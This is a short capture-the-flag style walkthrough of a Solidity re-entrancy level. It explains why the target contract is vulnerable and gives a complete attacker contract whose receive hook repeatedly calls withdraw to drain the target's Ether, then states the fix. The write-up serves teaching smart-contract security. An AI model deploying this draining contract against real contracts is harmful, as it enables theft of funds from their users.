Level 10: Re-entrancy

Objective:

Drain all Ether from the contract.

Vulnerability:

The contract sends ether before updating the users balance thus doing rentrancy

Explanation:

When the contract sends ether to a caller, it should first reduce the balance before transferring. Otherwise the attacker can re-enter the withdraw function repeatedly before the balance is updated.

Solution:

Deploy an attacker contract:

contract Attacker {
  Reentrance public target;

  constructor(address _target) payable {
    target = Reentrance(_target);
  }

  function attack() external {
    target.donate{value: 1 ether}(address(this));
    target.withdraw(1 ether);
  }

  receive() external payable {
    if (address(target).balance > 0) {
      target.withdraw(1 ether);
    }
  }
}

Key Takeaways:

Always update state before sending Ether.
